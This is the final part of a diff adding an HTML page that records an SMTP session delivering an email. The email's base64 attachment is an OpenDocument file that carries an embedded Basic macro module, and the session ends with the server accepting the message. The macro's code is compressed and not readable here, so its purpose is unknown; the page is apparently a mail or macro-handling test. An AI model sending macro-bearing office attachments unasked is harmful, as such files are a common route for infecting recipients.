+ -&gt; otC5CozdEiVZAledmPxYKXbgCUTzHwTsHQLpJHrGs7XPxnWn2xh3zh1GRMZTzI3yFoYhdTfYvZxK
+ -&gt; zfv+oWmaoHm/HA+jKKLL1hPhAdn27VhUKsaVEyyFlXjX+mxbiLJWSD4yPWWe/ANQSwcI+pCCbNMA
+ -&gt; AABSAQAAUEsDBBQAAAgAAJuuPFwAAAAAAAAAAAAAAAAQAAAAQ29uZmlndXJhdGlvbnMyL1BLAwQU
+ -&gt; AAgICACbrjxcAAAAAAAAAAAAAAAACgAAAHN0eWxlcy54bWzdW2lz27gZ/t5foVGmnXZmYR7yIam2
+ -&gt; PLvd3XZnkrSTZNuPOzAJUqhBggNAlp1fX5y8SdHa+KqcSSK8J97jAUDQl9f3GZndIcYxza/mwYk/
+ -&gt; n6E8ojHO06v5r19+Bsv59eYPlzRJcITWMY12GcoF4OKBID6TwjlfFwxxOQiF1rFj+ZpCjvk6hxni
+ -&gt; axGtaYFyJ7ruyqy1WTMecb4QV/OtEMXa8/b7/cl+cUJZ6n355CkaEOheeI47ZXFM+rhD3194qRdD
+ -&gt; AcEdRvt3TuJ+K7JeiWC1Wnma6lhjmg2oDjzJAdCdnAB33DxiuBBTp2+46xNPKMumSiveumwGxXZg
+ -&gt; TkvvgyTqvz68d/wmm1Ot2dzX7FFKS3NKwHC46Jx65ns1s6mW7jkBCQURzQpZGDekbXQ/anXPsECs
+ -&gt; TDTB+e1wohW1TDSD+9EpBb6neGqeRKOeRJBEpfKKtdgxopniyEMEqYlzLzgJynJWcrK8bbhYWvZb
+ -&gt; Qnd5bHrFxA/dF4hhRYJEi60bGupx0606uS4Vc11aVP4cFBYtyzSZXmJSLixtQpn68RpbeZqpnsGp
+ -&gt; thSvRLe6ozFbxNPFF3FdlhVixM8zj6GCMlEm4y6dnIq7dKAToi1kk5OimRsZVYGbnFLYsp0hAacK
+ -&gt; K966LKFHFLdFn5qGusp8l90gNjl3cjnoVHiCEXHZL/PX6wmlIOMA5xJlaLGuSRt1VrK2mJ7ON27l
+ -&gt; TKhcNRMYIRCjiPDNpfGjHJ6Z78rs1fw9lpPSEZl9hrlcYmQtONYMk4er+Z9gQflfW3xmcD5rqFb8
+ -&gt; IEW5nIdEIr7HnDc4CiwiuXjcQYZ1R3njrn2kgo47VXJMceeBC5Qd8scbiqEdN5sR53eMErgjdovi
+ -&gt; NFsPdTmDCBEyd+wFZDBlsNiCQmYVMYHlvsaQJLfUQgsQYy5grlZM/+QM51WMFOJ15bSfA5lMqCFz
+ -&gt; /FWSA78QeozAPN3BVA6hXA9EsikEky7/+nneVgtkocO8mYuKQ2l2HEa/IToTjvZ16yjWliP87WPX
+ -&gt; ogIigu5HbZY8vVZL6ha37ZakXz7qdPfkcUpydRZxVGbWfm/kR5YsF4zeKn8IlcDxbnF6fgZP5zO1
+ -&gt; LMhuJqSkXISrJEp0NvZSFaCF2eDmFKjvVoRvYUz3QJYiRwLcqxIJgmUgq6SP/lCnGzfVtkWuRyCj
+ -&gt; sUx/IWNV1ddYcarSgztBeQFVZeIYUcMKSbGFTnuxyyOx0xWovZY9h1W0y/zgHIEbhqDcK8nI4Eg0
+ -&gt; EovzGCkcVXt+zaqs6bNBAglHZaxdq/Aqf32+j/fNjiMgl2YVLm3cJkKwnXTXQD9V5oWK4h+rXhoG
+ -&gt; RYkyyQQYYjSD+SgKtfs2fETfEiTkigFuEct15Mx8uu7Y9jP+/oj+C/+9m4ajTnIITR29ms0QXIQv
+ -&gt; Ahd9Vr8NXNRhwgDyj4ZtPoAd3rCknAoaEpuVJV8ejkHT3ggoGZjQqCRzSAmOLXRkkMmiker0du97
+ -&gt; xuh+i2DMfwv934IeHtk8sToI+if+xfKiRKAGS4TU9sW1b4V6TcsNHEzkJ/ItRSEOSKUnYItwuhWu
+ -&gt; nFtE64m1IvuigLF6pgAkRmgHF6tTnDcoN1QIdeLuJRKUiAESM25UtBrsyprHHOuSHwLrHqkGWFv6
+ -&gt; N1jyn37v1ru7eNTmoQ+Kpm/ovh0Q9Xp+AFWsLyXXo70vJQf9LzmGZ9DcBVX4ZHHJHFjsuQX0oIw/
+ -&gt; bzHN7LcM5/rskUq5GKdYcGlDG+jR+WgArO2MRzDwHxJ+ZM+NCE9Hwkqo3k6Dmy3r0pbh/FaiCEiw
+ -&gt; cPgy2JvNdghP7aJtxsxjkZyyDJJqeG9R7YaSeLA8jaY6Uc/TUp3KGt1odQz9usvCGdBe0of1lyza
+ -&gt; Qqf2DmTVLit2OcW8IPABNDhmwVGZd1XzYpkPlu2I1rGml1i18bKvjSeEMhwPZfhGQxmOhbKX2Nzo
+ -&gt; TQ7lF+nH6wOaab737RUn+a4nfdDxGxjdym3WLo+bm7SoKjmY0hwScEOAYGpyOerQhCSXtMFwKHOU
+ -&gt; xWrP6J9cSGia6Y3i7N3SVz9H11R5/taf6aH9mVKRP214v2nvuHm6cLXWHywgqQ4Q3cVkkF52leWY
+ -&gt; DlEP0jtz/fG2IujLDyrzrhllB+i5IBdOe4jpZbFnEnVIGeBoWZoc0s8Cih1/q2D1d0rjo3y30z4G
+ -&gt; rqLIwNXT1cr5ue8/ArDRTrDapuqZwuBQ+6nCsFo9Lgw/wGevBBWApwxBFKlunh6C/0D9mO5Jw/Aq
+ -&gt; JvoTY5Q9f99rJ58sCIn+TDjOHTiR/b4D1feResz2+taDwfC9eKxGzp6G4cijp83EMaXq+89SqkcE
+ -&gt; auBkaQN13MHydwSqtrN9ZYFajAZq8dyBivXn6EBNm/0nxMcf771K7NHU9mnnCbf41f3ilEd/OkbD
+ -&gt; B7JDT/e0ePu89ngErV3mmNsKW5C990Ktii95NI7epWv1UuQPVN2AzPxZ6M8WvhmPr+YfAjlGQKAG
+ -&gt; t6H/VXlibl/FFmXI3sQaxf80b/o1GExceYPvPb5hqMWs2RpcsZxc4K56WzjsDYsRFb2OXAUbY+bC
+ -&gt; I8115A6bgxo5On4GS7jwF4cFu54uzldwguCiLQgXCzTF4mlbcCnFplg8awtGq1U0HlQjeN4VDIMA
+ -&gt; jQluq8cZ3USiUdGEEkL3KAaDOs7OAri80a3YLfDmYPWakm7X6u0kBUYZFDgCjnDwDigcugOKUYQz
+ -&gt; KOGYwAjxq7msidrt0Dj10XdH6lUUIDGE7kTDvQ9FFsx7mLq3os1XWwgD4qZaChQctU3asYRS9cZE
+ -&gt; c51Qc3B3zv5JuDpb2ItgCYmppNkr4uaguxxujtaumldLe7vrDXtl3XkJT911edvNpkteJxcTchj+
+ -&gt; n+Ww/qQ6ODmrHlTXNvL2nQEt5V8ETqrnnOqrnzJCNQ7ZYSnq1Etntm+joF5pzA5XtzcIrpaQQV6q
+ -&gt; KF87s4NK09ideL0feiDPuL+51K+7F/ZfvkXIcG+ur68vvfagHSlaQWhlXyWyeWTp7KBd8DDjh1hN
+ -&gt; GEtH/6Wmbb+oGRrM3wTOtdpYx1unqpGfCd5aznFvvU52DiXsk32pfiRfYSdf5htDqXoXUvn+2BSa
+ -&gt; AW/zZ/M/gQWps5rvf+nErmGxMaRbtOVFDIWbq/7tpfoBTW4MZiUTuINkp15r8MNz4AcgXM43vu/p
+ -&gt; P75vvVCMm+9mzmE5C99f6z+l033F2fTvTVSsS45XF9CvDG5Wq7qAGXv5Cvf6kcrr/1W7zf8AUEsH
+ -&gt; CJ+XJgRtCQAAqjcAAFBLAwQUAAgICACbrjxcAAAAAAAAAAAAAAAADAAAAG1hbmlmZXN0LnJkZs2T
+ -&gt; zW6DMBCE7zyFZc7YQC8FBXIoyrlqn8A1hlgFL/KaEt6+jpNWUaSq6p/U465GM9+OtJvtYRzIi7Ko
+ -&gt; wVQ0YyklykhotekrOrsuuaXbOtrYtisfmh3xaoOlnyq6d24qOV+WhS03DGzPs6IoeJrzPE+8IsHV
+ -&gt; OHFIDMa0jggJHo1CafXkfBo5zuIJZldRdOugkHn3ID2L3TqpoLIKYbZSvYe2IJGBQI0JTMqEdIMc
+ -&gt; uk5LxTOW81E5waHt4sdgvdODojxg8CuOz9jeiAym5V7gvbDuXIPffJVoeu5jenXTxfHfI5RgnDLu
+ -&gt; T+q7O3n/5/4uz/8Z4q+0dkRsQM6jZ/qQ57TyH1VHr1BLBwi092jSBQEAAIMDAABQSwMEFAAICAgA
+ -&gt; m648XAAAAAAAAAAAAAAAAAsAAABjb250ZW50LnhtbJ1XXW/jKBR9318ReaR5IzTNrLb1NKk0Wu1T
+ -&gt; uw/bjrSvBLCDBoMFOE7+/V7AdnAap9a+JAqcc+/hfkGeno+VXBy4sUKrTbZa3mULrqhmQpWb7Of7
+ -&gt; X+ghe97+9qSLQlCeM02biiuHqFYOvhfAVjavDbfwi7hgpDEq18QKmytScZs7muuaq56bf+TkwW9c
+ -&gt; p9au3SbbO1fnGLdtu2zXS21K/P4P9nvI8aPDPbo0jMlr6Pu7uzUuMSOOoIPg7Zeecdy76ipj9fj4
+ -&gt; iMPuALViwvQK//v68kb3vCJIKOuIovzMYp+zBnChTWUn8Pc4bvdgpqtJy4BA/AABHdCWGlG7uemI
+ -&gt; 6DQR3vVctsem3Iq4/USMH/ArbIaP15ceH8trrreuGBN/WuvBnSdERB+dbzj+Pp9srqejlajQUO1V
+ -&gt; DYW6k5dO25teWyMcN0OqpVC/pgvP7w6JNqS9eaTVHfaYRAm9qYQSSQfjZ2jdGBlAjGIuuT+4xavl
+ -&gt; amgvz4N268JlymEAFLpRLPZujB8/1twIv0VkoOUjC2ncrDvJ2bkO4JTtzno+JbsLz7qYX2LAux98
+ -&gt; Ekj97Rp7xAGUZnCuL4+FcZsKZWbN5tPXLOWa2t3Q+Ts2vNbGpV1+7FwN4Gs51dqPGM0KGHhQ1bqe
+ -&gt; aH17KGfn9lBOtBbdEzM7ywE8KhGfidk1Qi58V9yRuWSPTblS/49u6WKeWEhNqqbacTO7GOC++9Ay
+ -&gt; heCSzcuxRpW9TLBnR3MdM3kufMu2/dsg3iB2+B1uIySFhYcCELZP3RUzXl90q5KosiElpA1EdLay
+ -&gt; xYjiBW8yuAQhSITB4fzIzPeGQ1cfFFvaRi3hKjbLjvUG1zIjhi3fuXXLVyLU8+DlB0SSfiVV/V1q
+ -&gt; Gt8tfSR7w+5UgzsrqhraGm+f8NS58EQACngjoYJQjhin0gcgJGZYXsTf8VgvArIchCzeiIJLHJqj
+ -&gt; h1ZCnjbZV1Jr+/0CFxezxci0x6PSqxMw620rrB0hauEoXM8HYkSYWfi2tL+107dFDYg5ck4QuOoz
+ -&gt; PXgqht06aZyGR4agKNgZghs+R+qpXg3OOtGh5WHyyKZSWc9MF1EN5c+NE9wuCp3vDCe/0I7DqAOD
+ -&gt; 3nVvsYO3gvn3zt3y4eFRqKA/kTOtzUxpM7q9EAYrqaq45Rf3XJR7552v/ngA57cFN5YjXTtREYlS
+ -&gt; tjMNn6/bkeu6+8UKZhA3qIZO67r2T16QRrqLQyUHimOYCVtLcur0dNb8MwruR1RpBpakQW73USqe
+ -&gt; LIxuY6fZ6Tyr4N8HYXbPuds+Rdf+odLI0FnIcuc99qrONguhGJJkxyW82QsiLYiMGB9Yw0uwYBDM
+ -&gt; VPhz40fkNVQrJKMwluw56nEzfHbAGLU3L3DVk8OB0DkDI15XuVegoQG68MYsIMqlRCmmT89Yi6+Q
+ -&gt; KwZ91V74Bns+Ixfc8UpP8UZYGqOk3Ud5waPM4Ym/oNv/AFBLBwg1Ljg2PgQAAMMOAABQSwMEFAAI
+ -&gt; CAgAm648XAAAAAAAAAAAAAAAAAgAAABtZXRhLnhtbI1Ty47UMBC88xVR4Jr4kbeVyd44LQKJQeI2
+ -&gt; cuxOMGTskeNshr8nz5ldmAO3dLkq1dVtl0/Xc+e9gO2V0QefhNj3QAsjlW4P/rfjxyD3n6p3pWka
+ -&gt; JYBJI4YzaBecwXFvkuqetVbK7uD/cO7CEBrHMRyj0NgWUYwj1CLJHQ9eFIzv/U0xiw/+YDUzvFc9
+ -&gt; 0/wMPXOCmQvo3YLduWxpa62luFldBtstRlIg6GAW9YiEBO3ca6f0r0edkaIo0HK6U40xN+LcxZp3
+ -&gt; jxGjtb6xl+p/I2yzW0Js368GHvvVPt05a1UuiYUF7iZGME0PKoppGmAS0PxIUhYTFk26rEgLnKRJ
+ -&gt; iR4oSinYI2nB4igkcUYIpYSUaKetriCVmxYfyMEu/6q+HPNPJPq6Wfxz/FYlfosO+ir6i73BK7cF
+ -&gt; DZPY2OpZ1RY+L8ERTcI8jEP64Vnp4Xr6nqenNPZeMU4Xa36CcIgWWHLOMamnFcYZbbDIeJQXGOqU
+ -&gt; JwluZBaLVDZbD3e71f52f3s3JeidEt6CO153EAgzaDftxF9BAV23Y3jDTD23cUdRVaI320OPXkr1
+ -&gt; B1BLBwis23WlqgEAAGcDAABQSwMEFAAACAAAm648XPK7vdcTAQAAEwEAABgAAABUaHVtYm5haWxz
+ -&gt; L3RodW1ibmFpbC5wbmeJUE5HDQoaCgAAAA1JSERSAAABVQAAAc0IAwAAAJnnGDIAAAAJUExURf//
+ -&gt; /wAAAP///37vj08AAAAJcEhZcwAACxMAAAsTAQCanBgAAACwSURBVHja7cGBAAAAAMOg+VNf4AhV
+ -&gt; AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ -&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ -&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA3wBn/AABQqah+QAAAABJRU5E
+ -&gt; rkJgglBLAwQUAAgICACbrjxcAAAAAAAAAAAAAAAAFQAAAE1FVEEtSU5GL21hbmlmZXN0LnhtbLVU
+ -&gt; zWoDIRC+5ykWr2W1LT0UySbQQl+g6QMYHTeCq6JjSN6+7pJNtpRAFpKb44zfz8zgcn3obLWHmIx3
+ -&gt; DXmhz6QCJ70yrm3Iz+arfifr1WLZCWc0JOTjoSrvXDqHDcnRcS+SSdyJDhJHyX0Ap7zMHTjkf+v5
+ -&gt; wHSOJgLeyAnaejiMuLHlI5D22SmBpfpEBIcA0fQpYbnX2kjgE4SBabWoLha0sVCX8ni8CNDZ2joI
+ -&gt; 3DWEXdV1aQIoI2o8BmiICMEaOQhie6fo0AM6tU5TiCBU2gEgYXOkJEAsg0i0+LlCj8Ui69OzgD+K
+ -&gt; SMm+UZRWRsU2Jf1ojiSjCVjb7YOIRnx5d/xP77RpcxxmnF7ZjYuQsuul0GyonCLMXAE8Wrj/Aox3
+ -&gt; NCp9g59S9TSbo7jGfv3vrh1Q3B10s8vd1gljE8PxSINrr5CYTrTA+nxhWbJ/3+PqF1BLBwi6egue
+ -&gt; UAEAAFkFAABQSwECFAAUAAAIAACbrjxchWw5ii4AAAAuAAAACAAAAAAAAAAAAAAAAAAAAAAAbWlt
+ -&gt; ZXR5cGVQSwECFAAUAAgICACbrjxcQcgQYKIEAAB0JQAADAAAAAAAAAAAAAAAAABUAAAAc2V0dGlu
+ -&gt; Z3MueG1sUEsBAhQAFAAICAgAm648XMUazrtIAQAAGQIAABcAAAAAAAAAAAAAAAAAMAUAAEJhc2lj
+ -&gt; L1N0YW5kYXJkL1Rlc3QueG1sUEsBAhQAFAAICAgAm648XLWHlZvTAAAAWQEAABwAAAAAAAAAAAAA
+ -&gt; AAAAvQYAAEJhc2ljL1N0YW5kYXJkL3NjcmlwdC1sYi54bWxQSwECFAAUAAgICACbrjxc+pCCbNMA
+ -&gt; AABSAQAAEwAAAAAAAAAAAAAAAADaBwAAQmFzaWMvc2NyaXB0LWxjLnhtbFBLAQIUABQAAAgAAJuu
+ -&gt; PFwAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAO4IAABDb25maWd1cmF0aW9uczIvUEsBAhQAFAAI
+ -&gt; CAgAm648XJ+XJgRtCQAAqjcAAAoAAAAAAAAAAAAAAAAAHAkAAHN0eWxlcy54bWxQSwECFAAUAAgI
+ -&gt; CACbrjxctPdo0gUBAACDAwAADAAAAAAAAAAAAAAAAADBEgAAbWFuaWZlc3QucmRmUEsBAhQAFAAI
+ -&gt; CAgAm648XDUuODY+BAAAww4AAAsAAAAAAAAAAAAAAAAAABQAAGNvbnRlbnQueG1sUEsBAhQAFAAI
+ -&gt; CAgAm648XKzbdaWqAQAAZwMAAAgAAAAAAAAAAAAAAAAAdxgAAG1ldGEueG1sUEsBAhQAFAAACAAA
+ -&gt; m648XPK7vdcTAQAAEwEAABgAAAAAAAAAAAAAAAAAVxoAAFRodW1ibmFpbHMvdGh1bWJuYWlsLnBu
+ -&gt; Z1BLAQIUABQACAgIAJuuPFy6egueUAEAAFkFAAAVAAAAAAAAAAAAAAAAAKAbAABNRVRBLUlORi9t
+ -&gt; YW5pZmVzdC54bWxQSwUGAAAAAAwADADoAgAAMx0AAAAA
+ -&gt; 
+ -&gt; ------=_MIME_BOUNDARY_000_204001--
+ -&gt; 
+ -&gt; 
+ -&gt; .
+&lt;-  250 Data received OK.
+ -&gt; QUIT
+&lt;-  221 localhost Service closing channel.
+=== Connection closed with remote host.</code></pre></div>
+</div></div>
+					</body>
+				</html>
+			
